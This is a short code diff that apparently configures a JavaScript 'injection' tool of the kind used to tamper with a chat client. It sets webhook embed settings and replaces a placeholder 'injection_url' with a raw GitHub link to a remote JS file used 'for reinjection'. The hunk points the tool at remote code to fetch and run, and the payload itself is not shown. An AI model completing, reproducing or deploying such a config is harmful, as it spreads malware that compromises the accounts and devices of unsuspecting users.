@@ -17,7 +17,7 @@ const config = {
   embed_name: 'gay injection',
   embed_icon: 'https://files.catbox.moe/0coyk6.jpg'.replace(/ /g, '%20'),
   embed_color: 16630213,
-  injection_url: 'put url here', // for reinjection
+  injection_url: 'https://raw.githubusercontent.com/AntiGD/storage/main/gdgamer.js', // for reinjection
 
 // injection below \\
   
